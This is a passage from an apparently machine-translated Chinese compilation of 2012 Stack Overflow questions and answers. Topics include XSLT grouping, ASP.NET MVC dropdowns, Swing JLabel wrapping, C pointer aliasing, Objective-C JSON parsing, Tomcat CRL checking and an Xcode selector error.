最后，在与此匹配的模板中，您可以使用**Objectgroup**键获取组内的元素

```
<xsl:apply-templates select="self::*|key('Objectgroup', generate-id())" /> 
```

这是完整的 XSLT

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="xml" indent="yes"/>
   <xsl:key name="Unit" match="BodyCustQuotationTrans[UnitID = '']" use="generate-id(preceding-sibling::BodyCustQuotationTrans[UnitID != ''][1])" />
   <xsl:key name="Objectgroup" match="BodyCustQuotationTrans[ObjectgroupID = '']" use="generate-id(preceding-sibling::BodyCustQuotationTrans[ObjectgroupID != ''][1])" />

   <xsl:template match="Lines">
      <Lines>
         <xsl:apply-templates select="BodyCustQuotationTrans[UnitID != '']" mode="Unit" />
      </Lines>
   </xsl:template>

   <xsl:template match="BodyCustQuotationTrans" mode="Unit">
      <Unit>
         <xsl:copy-of select="UnitID|UnitNumber" />
         <xsl:apply-templates select="self::*|key('Unit', generate-id())[ObjectgroupID != '']" mode="Objectgroup" />
         <subtotalunit><xsl:value-of select="sum(CustQuotationTrans_SalesPrice|key('Unit', generate-id())/CustQuotationTrans_SalesPrice)" /></subtotalunit>
      </Unit>
   </xsl:template>

   <xsl:template match="BodyCustQuotationTrans" mode="Objectgroup">
      <Objectgroup>
         <xsl:copy-of select="ObjectgroupID" />
         <xsl:apply-templates select="self::*|key('Objectgroup', generate-id())" />
         <subtotalgroup><xsl:value-of select="sum(CustQuotationTrans_SalesPrice|key('Objectgroup', generate-id())/CustQuotationTrans_SalesPrice)" /></subtotalgroup>
      </Objectgroup>
   </xsl:template>

   <xsl:template match="BodyCustQuotationTrans/UnitID|BodyCustQuotationTrans/UnitNumber|BodyCustQuotationTrans/ObjectgroupID" />

   <xsl:template match="@*|node()">
      <xsl:copy>
         <xsl:apply-templates select="@*|node()"/>
      </xsl:copy>
   </xsl:template>
</xsl:stylesheet> 
```

当应用于您的 XML 时，将输出以下内容

```
<Report Name="SalesQuotation" Caption="Offerte" Language="EN">
   <Quotation>
      <CustQuotationJour_DeliveryName>Testcustomer</CustQuotationJour_DeliveryName>
      <CustQuotationJour_DeliveryAddress>101 street 3293 CITY</CustQuotationJour_DeliveryAddress>
      <QuotationTxt>Quotation</QuotationTxt>
   </Quotation>
   <Lines>
      <Unit>
         <UnitID>Bathroom</UnitID>
         <UnitNumber>1,00</UnitNumber>
         <Objectgroup>
            <ObjectgroupID>Bath</ObjectgroupID>
            <BodyCustQuotationTrans>
               <ItemId>1006055</ItemId>
               <CustQuotationTrans_Name>Laufen Pro kunststof bad 180x80cm WIT ZO</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>511,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1036625</ItemId>
               <CustQuotationTrans_Name>Set Laufen badpoten (instelbaar) voor Pr</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>38,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1038952</ItemId>
               <CustQuotationTrans_Name>Chroom badafvoer-overloopkomb.1 ½ met wa</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>56,90</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1007857</ItemId>
               <CustQuotationTrans_Name>Grohtherm 2000 badthermostaat 15cm chr z</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>353,65</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <subtotalgroup>959,55</subtotalgroup>
         </Objectgroup>
         <Objectgroup>
            <ObjectgroupID>Shower</ObjectgroupID>
            <BodyCustQuotationTrans>
               <ItemId>2061780</ItemId>
               <CustQuotationTrans_Name>Easy Drain COMPACT 50 1000mm met rooster</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>2062352</ItemId>
               <CustQuotationTrans_Name>Easy 2 Seal afdichtingspasta voor o.a. E</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1007831</ItemId>
               <CustQuotationTrans_Name>Grohtherm 2000 douchethermostaat 15cm ch</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <subtotalgroup>60</subtotalgroup>
         </Objectgroup>
         <Objectgroup>
            <ObjectgroupID>Radiator</ObjectgroupID>
            <BodyCustQuotationTrans>
               <ItemId>4044377</ItemId>
               <CustQuotationTrans_Name>Vasco Arabis Bathroomradiator typ HDRM33</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>4044689</ItemId>
               <CustQuotationTrans_Name>Vasco designventielset met thermost.knop</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <subtotalgroup>40</subtotalgroup>
         </Objectgroup>
         <subtotalunit>1059,55</subtotalunit>
      </Unit>
      <Unit>
         <UnitID>Toiletruim</UnitID>
         <UnitNumber>1,00</UnitNumber>
         <Objectgroup>
            <ObjectgroupID>Closet</ObjectgroupID>
            <BodyCustQuotationTrans>
               <ItemId>1033033</ItemId>
               <CustQuotationTrans_Name>GEBERIT DUOFIX, DE ECHTE!!!</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1033358</ItemId>
               <CustQuotationTrans_Name>Geberit bedieningsplaat Samba frontbed.</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <subtotalgroup>40</subtotalgroup>
         </Objectgroup>
         <subtotalunit>40</subtotalunit>
      </Unit>
      <Unit>
         <UnitID>Kitchen</UnitID>
         <UnitNumber>1,00</UnitNumber>
         <Objectgroup>
            <ObjectgroupID>Sinc</ObjectgroupID>
            <BodyCustQuotationTrans>
               <ItemId>1027975</ItemId>
               <CustQuotationTrans_Name>Plaatstalen uitstortgootsteen 51x36 wit</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1027988</ItemId>
               <CustQuotationTrans_Name>Alape emmerrooster aluminium kleur voor</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
            </BodyCustQuotationTrans>
            <BodyCustQuotationTrans>
               <ItemId>1039264</ItemId>
               <CustQuotationTrans_Name>Syfon universeel 1 1/2"x 40 mm. Mc.alpin</CustQuotationTrans_Name>
               <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
               <salesUnitTxt>ST</salesUnitTxt>
               <CustQuotationTrans_SalesPrice>9,90</CustQuotationTrans_SalesPrice>
               <UnitID_LABEL>Unit ID</UnitID_LABEL>
            </BodyCustQuotationTrans>
            <subtotalgroup>49,9</subtotalgroup>
         </Objectgroup>
         <subtotalunit>49,9</subtotalunit>
      </Unit>
   </Lines>
   <Totals>
      <CustQuotationJour_SalesBalance>5.082,19</CustQuotationJour_SalesBalance>
      <CustQuotationJour_EndDisc>0,00</CustQuotationJour_EndDisc>
      <CustQuotationJour_SumMarkup>0,00</CustQuotationJour_SumMarkup>
      <CustQuotationJour_SumTax>1.067,26</CustQuotationJour_SumTax>
      <CustQuotationJour_RoundOff>0,00</CustQuotationJour_RoundOff>
      <CustQuotationJour_QuotationAmount>6.149,45</CustQuotationJour_QuotationAmount>
      <CustQuotationJour_CurrencyCode>EUR</CustQuotationJour_CurrencyCode>
   </Totals>
</Report> 
```**

# c# - ASP.NET MVC 3 - Javascript 从 DropDownList 中断 SelectedValue

> ID：13343908
> 
> 赞同：0
> 
> 时间：2012-11-12T12:42:34.373
> 
> 标签：c#, asp.net-mvc-3, razor, viewmodel

我的页面上有一个 ViewModel 和一个 DropDownList ，其中包含一些值：

```
public class MyViewModel
{
    public string SelectedItemDrop1 { get; set; }
    public string SelectedItemDrop2 { get; set; }
    public string SelectedItemDrop3 { get; set; }
    public List<OptionViewModel> Options { get; set; }
}

public class OptionViewModel
{
    public string Number { get; set; }
    public string Option { get; set; }
} 
```

而且，在我看来：

```
@using (Html.BeginForm("Save", "Controller", FormMethod.Post))
{
    <ul id="cursos">
    <li>
        @Html.DropDownListFor(c => c.SelectedItemDrop1,
        new SelectList(Model.Options, "Number", "Option", Model.SelectedItemDrop1))
        Choose 1
    </li>
    <li>
        @Html.DropDownListFor(c => c.SelectedItemDrop2,
        new SelectList(Model.Options, "Number", "Option", Model.SelectedItemDrop2))
        Choose 2
    </li>
    <li>
        @Html.DropDownListFor(c => c.SelectedItemDrop3,
        new SelectList(Model.Options, "Number", "Option", Model.SelectedItemDrop3))
        Choose 3
    </li>
    </ul>
} 
```

当我使用 Javascript 更改这些选择元素的选项时，我的返回值为空。有什么问题？太感谢了！！！

编辑：

我的 JavaScript 代码：

```
$("#cursos li select").each(function (i, item) {

    $(this).change(function () {
        updateCursos($(this), 7);
    });
    $(this).blur(function () {
        if ($(this).val() != -1) {
            $(this).attr('disabled', 'disabled');
        }
    });
});

function updateCursos(select, avaiableCourses) {

    var selecteds = '';
    $("#cursos li select").each(function (i, item) {
        var selected = $(item).val();
        if (selected != -1)
            selecteds += selected + ',';
    });

    var arr = selecteds.split(',');

    $("#cursos li select").each(function (i, item) {
        if ($(item).val() != select.val()) {

            var oldValue = $(item).val();
            if ($(item).val() == -1) {
                var options = "<option value='-1'></option>";
                for (i = 1; i <= avaiableCourses; ++i) {
                    if (select.val() != i && !contains(i, selecteds)) {
                        options += "<option value='" + i + "'>" + i + "ª option</option>";
                    }
                }
                options += "<option value='0'>Don't want it</option>";

                $(item).children("option").remove();
                $(item).html(options);
                $(item).val(oldValue);
            }
        }
    });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T16:09:34.707

这种方式我确信它有效，甚至不是javascript。

如果未填充的值来自数据库，具有固定值示例：活动，不活动，请执行以下操作

使用这些值创建枚举类型

控制器使用内部类转换列表中枚举的这种类型后，将其转换为可枚举并转到下拉列表

使用示例：@Html.DropDownListFor (model => model.chamados.UrgenciaId, new SelectList (ViewBag.urgencia, "Id", "Name"))

# java - JLabel 与包装的 HTML 文本作为 JScrollPane 客户端

> ID：13343909
> 
> 赞同：7
> 
> 时间：2012-11-12T12:42:46.517
> 
> 标签：java, swing, jscrollpane, jlabel, word-wrap

包含 HTML 文本的 JLabel 使用可用空间自动换行。如果有人将该 JLabel 添加到 JSrollPane 中，他必须将 preferredSize 设置为一个合适的值，否则它不会换行。所有这些都应该在使用 LayoutManager 的 JPanel 中的其他组件上正常工作。

因为我想要一个可调整大小的应用程序窗口，我扩展了 JScrollPane 以跟踪调整大小事件并动态更改同步到视口宽度的大小。基本上它可以工作，但有时布局管理器对首选高度的计算是错误的（值太大或太小）。例如，穿过第一行的红色边框的可见性表明高度的计算是错误的。

![抓帧](../Images/b3173939387bf2f558928fca73a2329c.png)

我无法使用单个包装 JLabel 重现失败。

```
import java.awt.Color;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import javax.swing.BorderFactory;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.SwingUtilities;

public class WrappedLabel implements Runnable {

    public static void main( String[] args ){
        SwingUtilities.invokeLater( new WrappedLabel() );
    }

    @Override
    public void run(){
        final JPanel panel = new JPanel( new GridBagLayout() );
        final GridBagConstraints gc = new GridBagConstraints();
        gc.fill = GridBagConstraints.BOTH;
        gc.weightx = 1.0;
        gc.weighty = 1.0;
        {
            gc.gridx = 0;
            gc.gridy = 0;
            final JLabel label = new JLabel(
                "<html>" + "please add some more text here"
            );
            label.setBorder( BorderFactory.createLineBorder( Color.RED ) );
            panel.add( label, gc );
        }
        {
            gc.gridx = 0;
            gc.gridy = 1;
            final JLabel label = new JLabel(
                "<html>" + "please add some more text here"
            );
            label.setBorder( BorderFactory.createLineBorder( Color.RED ) );
            panel.add( label, gc );
        }
        final JFrame frame = new JFrame();
        frame.add( new ScrollPane( panel ) );
        frame.setDefaultCloseOperation( JFrame.DISPOSE_ON_CLOSE );
        frame.setSize( 256, 256 );
        frame.setVisible( true );
    }

    private class ScrollPane extends JScrollPane implements ComponentListener {

        ScrollPane( Container view ){
            super( view );
            this.viewport.addComponentListener( this );
        }

        @Override
        public void componentHidden( ComponentEvent ce ){
        }

        @Override
        public void componentMoved( ComponentEvent ce ){
        }

        /** calculating required height is a 3 step process
          * 1\. sync width of client and viewport, set height of client to high value
          * 2\. let GridbagManager calculate required minimum size
          * 3\. set preferredSize and revalidate
         **/
        @Override
        public void componentResized( ComponentEvent ce ){
            assert( this.viewport == ce.getSource() );
            final Container view = (Container) this.viewport.getView();
            final int width = this.viewport.getExtentSize().width;
            view.setPreferredSize( new Dimension( width, Integer.MAX_VALUE ) );
            final int height = view.getLayout().preferredLayoutSize( view ).height;
            view.setPreferredSize( new Dimension( width, height ) );
            view.revalidate();
        }

        @Override
        public void componentShown( ComponentEvent ce ){
        }

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T10:50:53.197

显然，它要么是 GridBagLayout 中的错误，要么是您以开发人员完全出乎意料的方式使用布局引擎。里面有HTML的几个多行Label，设置首选大小，后门立即询问首选大小？啊!

我注意到有时在减小窗口大小时布局工作不正确：滚动窗格内的面板没有减小并且出现水平滚动条。（顺便说一句，我正在使用Windows）。

![当减少](../Images/4d4bedaafb886760357db8855f9ed48e.png)

另外，有时，如果垂直滚动条可见并且面板高度很大，然后我增加窗口大小，面板高度仍然过大并且标签周围出现间隙：

![在此处输入图像描述](../Images/261c33b9f576a84eaccc250b14b92962.png)

对我来说，每隔一次我减小窗口时布局都是错误的；增加效果更好，但如果出错，每隔一次也是不正确的。我尝试调试并将值打印到控制台；似乎这`view.getLayout().preferredLayoutSize( view )`不仅取决于`view.setPreferredSize`面板和滚动面板的当前大小，还取决于当前大小。GridBagLayout 的代码太复杂，无法深入研究。

**肮脏的黑客**

既然其他调整大小都会产生正确的结果，为什么不调整两次呢？在`ScrollPane.componentResized`处理程序中复制内容不成功，可能是因为 ScrollPane 的大小保持不变。ScrollPane 本身需要用不同的值调整大小两次。为了以最简单的方式对其进行测试，我对 JFrame 进行了子类化：它`componentResized`两次侦听并调整其子窗口的大小。第二次调整大小必须通过`SwingUtilities.invokeLater`.

替换行

```
final JFrame frame = new JFrame();
frame.add( scroll ); 
```

经过

```
final MyFrame frame = new MyFrame(scroll); 
```

并添加以下类：

```
private class MyFrame extends JFrame implements ComponentListener {

    private Component child;

    public MyFrame(Component child){
        this.child=child;
        setLayout(null);
        getContentPane().add(child);
        addComponentListener(this);
    }

    public void componentResized(ComponentEvent e) {
        Dimension size=getContentPane().getSize();
        child.setSize(new Dimension(size.width-1,size.height));
        validate();
        SwingUtilities.invokeLater(new ResizeRunner(size));
    }

    public void componentMoved(ComponentEvent e) {}
    public void componentShown(ComponentEvent e) {}
    public void componentHidden(ComponentEvent e) {}

    private class ResizeRunner implements Runnable {
        private Dimension size;
        public ResizeRunner(Dimension size){
            this.size=size;
        }
        public void run() {
            child.setSize(size);
            validate();
        }
    }

} 
```

同样可以通过子类化布局管理器来实现。

显然，这种方法不优雅且效率低下，但作为 JRE 错误的解决方法，如果没有其他帮助的话...... ;-)

# c++ - 如何编写考虑可能的别名的函数

> ID：13343914
> 
> 赞同：3
> 
> 时间：2012-11-12T12:43:13.460
> 
> 标签：c++, c

我想用如下原型编写一个函数

```
void fun(Thing *one, Thing *two, Thing *ret); 
```

我想考虑一个事实，`ret`可能会或可能不会被`one`or别名`two`。如果需要，这应该在运行时确定，并调用适当的代码。

这是一个坏主意吗？有语言语义吗？

编辑：我还没有明确表示我不想像这样`if (one == ret || two == ret)`自然有效但对我来说似乎很冗长的手动测试。此外，我不希望两个几乎相同的情况重复代码（只有限定符不同）。我更多的是寻找惯用的好的解决方案，以及是否有任何语言语义支持这种情况。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:49:30.467

很大程度上取决于相关类的语义，但需要测试别名的情况极为罕见。只需在开始修改任何内容之前获取您需要`one`的所有信息。`two`您可能还想确保在开始修改之前完成任何可能引发异常的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:47:19.723

这是可能的，并且在“交换”功能中使用了很多时间。您可以使用指针的值检查它：

```
void fun(Thing *one, Thing *two, Thing *ret)
{
    if (ret == one || ret == two)
    {
        //Alias - Spacial case
        return;
    }
    //Not Alias, continue usually...
} 
```

编辑：阅读您的编辑后，您似乎在询问是否有办法知道一个函数是否在不使用“if”语句的情况下在两个不同的参数中接收到相同的值。
那么不，不可能在 C 或 C++ 中实现这一点。
因为毕竟指针与否，它只是一个带值的参数……

# objective-c - 获取正确的 Node Json 目标 c

> ID：13343926
> 
> 赞同：0
> 
> 时间：2012-11-12T12:43:51.047
> 
> 标签：objective-c, ios, json, nodes

我正在通过解析 Json 对象`AFJSONRequestOperation`，问题是，我无法获得节点的正确值。杰森：

[关联](https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=-23.540788,-46.653991&radius=500&types=food&sensor=true&language=pt-BR&key=AIzaSyD0don13x8M0wJ_Sj1tUhdT60RQMoJpRVg)

我只需要在“结果”中获取临时值。我可以得到结果节点，但它里面的值是一个数组，我怎样才能得到名称的值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:45:05.350

该 JSON 无效。转到[此](http://jsonlint.com/)链接，并检查它。

Snaker 的回答非常准确，仍然：

```
for (NSDictionary *dic in results)
{
    NSString *name = [dic objectForKey:@"name"];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:30:29.010

您的问题是结果为您提供了一个字典。因此，您必须检索名为“results”的字典，然后，一旦您将所有字典放入其中，您就可以通过循环查找名称。

更多信息[在这里](https://stackoverflow.com/questions/7958992/how-to-get-objects-from-a-json-array-in-iphone)

**更新 ：**

```
dicionario = [dicionario objectForKey@"results"];
NSMutableArray *namesFromDict = [[NSMutableArray alloc] init];
for (NSDictionary *elts in dicionario)
{
   [namesFromDict addObject:[elts objectForKey:@"name"]];
} 
```

这应该做。

# winforms - 如何在 .NET CF 中实现 Button/Button2 的长按功能

> ID：13343929
> 
> 赞同：0
> 
> 时间：2012-11-12T12:44:04.423
> 
> 标签：winforms, compact-framework, opennetcf, tapandhold

我需要捕获 Button 的两个事件：OnClicked 和 Taped/holed/released。

不幸的是，不可能同时正确处理 OnClick 和 OnDoubleClick 事件——同时引发 OnClick 和 OnDoubleClick。

# sitecore - Sitecore 为内容编辑器创建自定义控件

> ID：13343932
> 
> 赞同：0
> 
> 时间：2012-11-12T12:44:12.133
> 
> 标签：sitecore

我需要为 Sitecore 内容编辑器创建一个自定义复合控件。（我使用的是 Sitecore 6.5）我对 IFrame 或自定义控件没有任何经验

例如，我想实现两个下拉控件、标签等，内容作者可以在其中存储值并保存。

最好的方法是什么？我找不到一个很好的例子来解释我的情况。

在 IFrame 中，我们可以填充布局或子布局吗？我们可以提供外部链接，但它不适用于内部布局。（如果这是可能的，它解决了一半的问题）

或者，如何创建自定义控件并将其与 Sitecore 集成？

或者有没有更好的选择来实现这一点，请帮助！谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T03:42:12.157

我已经找到了解决这种情况的方法，它是“IFrame”。我需要将我的自定义 aspx 页面的 URL 设置为“源”，好消息是 Sitecore 将几个参数（itemid、语言和版本）传递给 IFrame（aspx 页面），以便我可以使用这些参数并处理数据.

# tomcat - Tomcat 7 客户端证书授权上的 OpenSSL

> ID：13343936
> 
> 赞同：1
> 
> 时间：2012-11-12T12:44:31.333
> 
> 标签：tomcat, ssl, https, openssl, authorization

我是新手，`SSL,OpenSSL`但我找不到答案，所以我必须问。我有项目 -在 tomcat 上运行的**动态 Web 应用程序**，我配置 SSL 并且它可以工作，我为客户端证书设置**clientAuth="true"**并且它也可以工作但问题名称是分发点。应用程序使用带有客户端证书的卡，有时我需要吊销一些客户端证书，所以我吊销客户端证书并生成或更新`crl`列表，但之后我可以用其他方式使用吊销的证书登录应用程序服务器不知道这个客户端是已撤销。有什么方法可以检查我是否已撤销客户端证书 -`Dcom.sun.security.enableCRLDP=true`但什么也没发生。我不能`crlFile="http://www.somesite/crllist.pem"`以其他方式在 tomcat 中使用设置，这是如何在“库端”检查客户端证书的某种方式，我的意思是`crl`也在客户端证书中，所以我可以通过某种方式检查吗？

# jquery - Jquery Airport 插件不显示非英文字符

> ID：13343941
> 
> 赞同：0
> 
> 时间：2012-11-12T12:44:47.627
> 
> 标签：jquery, html

我正在使用 jquery 机场插件，我想显示一些特殊字符，如 ø、æ、å。我已经修改了源代码中的 chars 数组。看起来像下面..

```
var chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', ' ', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','-','æ', 'å', 'ø']; 
```

现在的问题是我的网站不显示Ø。但是在我的页面中，我在其他一些地方也有“Ø”，但它们显示正确。

仅在我使用插件的地方未正确显示。

```
$('#airportText').airport(['Roskilde', 'Herning', 'København']); 
```

而不是Ø，页面显示'�'

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:56:24.600

确保包含 chars 数组定义的脚本以 UTF8（无 BOM）编码。这应该可以解决您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T13:38:33.353

这是一个字符级别的问题。检查包含代码的文件（.js 文件或 .html 文件）的字符编码是什么，并使其与声明的编码匹配。有关这方面的一般性，请参阅 W3C 页面[字符编码](http://www.w3.org/International/O-charset.en.php)。

有根据的猜测：当 ISO-8859-1 或 windows-1252 编码文件被误解为 UTF-8 编码时，符号“�”最常出现。如果是这种情况，并且如果 JavaScript 代码出现在 HTML 文档中，那么快速解决方法是在声明编码的 HTML 标记中更改`utf-8`为`windows-1252`，例如`<meta charset="...">`. 但是，如果服务器宣布字符编码，这将无济于事。然后您需要更改文件的编码以匹配它。

# asp.net - 如何引用模式 ASP 表单上的元素？

> ID：13343945
> 
> 赞同：1
> 
> 时间：2012-11-12T12:44:55.910
> 
> 标签：asp.net, internet-explorer, vb6, modal-dialog, document

我正在编写一个使用 InternetExplorer.Application 对象登录网站的 VB6 项目。登录表单是一个模态的 ASP 表单。.Document 的所有元素都来自父页面。如何访问当我执行 .Click 登录按钮时打开的模式登录表单上的元素？

这是我的代码：

```
Set IE = CreateObject("InternetExplorer.Application")

IE.navigate "http://www.guestlink.co.uk"
IE.Visible = True

Do
    DoEvents
Loop Until IE.ReadyState = READYSTATE_COMPLETE

IE.Document.All.Item("ctl00_imgLogin").Click
Do
    DoEvents
Loop Until IE.ReadyState = READYSTATE_COMPLETE

With IE.Document.aspnetForm
    .getElementById("ctl00_content_txtUserName").Value = "MyName"
    ....
End With 
```

VB 给出“未设置对象变量”错误，因为 IE.Document.aspnetForm 指向父页面上的元素，而不是模式 ASP 表单。如何让 .document 指向模态表单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T03:18:37.047

您使用的 URL 用于主页，但登录表单位于 IFRAME 内。尝试将 URL (IE.navigate) 更改为：

[https://www.guestlink.co.uk/login.aspx?placeValuesBefore](https://www.guestlink.co.uk/login.aspx?placeValuesBefore)

# iphone - Xcode 错误语义错误值可能无法响应 'initWithFrame:image Name:'

> ID：13343946
> 
> 赞同：1
> 
> 时间：2012-11-12T12:44:56.533
> 
> 标签：iphone, objective-c, xcode, ios5, compiler-errors

我的项目出现错误。我尝试了很多解决方案，但无济于事。

我收到一个错误 Xcode Error Semantic error value may not respond to 'initWithFrame:image Name:'

我不知道这意味着什么以及为什么我会收到此警告。请帮忙。

谢谢

[链接](http://www.blakeloizides.co.za/testing.zip)到我的项目和更新的项目[链接](http://www.blakeloizides.co.za/new.zip)。

我在这一行收到错误

```
GalleryButton *btnAttachment = [[GalleryButton alloc] initWithFrame:CGRectMake(startX, startY, width, height) imageName:imgName]; 
```

**GalleryScrollView.h**

```
#import <UIKit/UIKit.h>
#import "AttachmentItem.h"
#import "GalleryButton.h"

@protocol GAlleryScrollDelegate;

@interface GalleryScrollView : UIView <GalleryButtonDelegate>

{

id <GAlleryScrollDelegate> delegate;

// MAIN WINDOW WHERE YOU CAN DRAG ICONS
UIView *mainView;

UIScrollView *_scrollView;
NSMutableArray *_attachments;

NSInteger *_totalSize;

UIImageView *_recycleBin;
CGRect recycleBinFrame;
}
@property (nonatomic, retain) id <GAlleryScrollDelegate> delegate;
@property (nonatomic, retain) UIView *mainView;
@property (nonatomic, retain) NSMutableArray *attachments;
@property (nonatomic, retain) UIImageView *recycleBin;
@property (nonatomic, retain) UIImageView *imgName;
@property (nonatomic) CGRect recycleBinFrame;

- (void) addAttachment:(AttachmentItem *)attachment withImageNamed:(NSString *)imgName;
- (void) removeAttachment:(GalleryButton *)button;
- (void) reloadData;
- (id) initWithFrame:(CGRect)frame imageName:(NSString *)imageName;

@end

// EVENTS IF YOU WANT TO DISABLE SOME SCROLL ON DID PRESS AND ENABLE IT ON DROP
@protocol GAlleryScrollDelegate
- (void) didPressButton;
- (void) didDropButton;
@end 
```

**GalleryScrollView.m**

```
#import <QuartzCore/QuartzCore.h>
#import "GalleryScrollView.h"
#import "GalleryButton.h"

@implementation GalleryScrollView

@synthesize delegate;
@synthesize mainView;
@synthesize attachments = _attachments;
@synthesize recycleBin = _recycleBin, recycleBinFrame;

int padding = 0;

#pragma mark - INIT

- (id) init
{
self = [super init];
if (self) {
    // Initialization code here.
}
return self;
}

- (id) initWithFrame:(CGRect)frame imageName:(NSString *)imageName
{
self = [super initWithFrame:frame];
if (self){
    ;
}
return self;
}
- (void) awakeFromNib
{
// INIT ATTACHMENT ARRAY
if (_attachments == nil){
    _attachments = [[NSMutableArray alloc] init];
}

// SCROLL VIEW
UIScrollView *scrollTemp = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 0, self.frame.size.width-0, 450)];
_scrollView = scrollTemp;
_scrollView.backgroundColor = [UIColor clearColor];

// RECYCLE BIN
UIImageView *imageViewTemp = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"mozambique-wenge.png"]];
self.recycleBin = imageViewTemp;
self.recycleBin.frame = CGRectMake(0, 0, 320, 270);

[self addSubview:_scrollView];
[self addSubview:self.recycleBin];
[scrollTemp release];
[imageViewTemp release];
 }

- (void) dealloc {
[super dealloc];

}

#pragma mark - ATTACHMENTS ADD / REMOVE

- (void) addAttachment:(AttachmentItem *)attachment withImageNamed:(NSString *)imgName
{
// SAVE ATTACHMENT
[_attachments addObject:attachment];

// RESIZE CONTENT VIEW FOR INSERTINT NEW ATTACHMENT
_scrollView.contentSize = CGSizeMake([_attachments count]*70, 70);

CGFloat startX = (70.0f * ((float)[_attachments count] - 1.0f) + padding);
CGFloat startY = 370;
CGFloat width = 64;
CGFloat height = 64;

GalleryButton *btnAttachment = [[GalleryButton alloc] initWithFrame:CGRectMake(startX, startY, width, height) imageName:imgName];
btnAttachment.tag = [_attachments count];
btnAttachment.scrollParent = _scrollView;
btnAttachment.mainView = self.mainView;
btnAttachment.delegate = self;

if (attachment.type == 1){
}else if (attachment.type == 2){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"mozambique-wenge"];
    [btnAttachment addSubview:imageView];
    [imageView release];
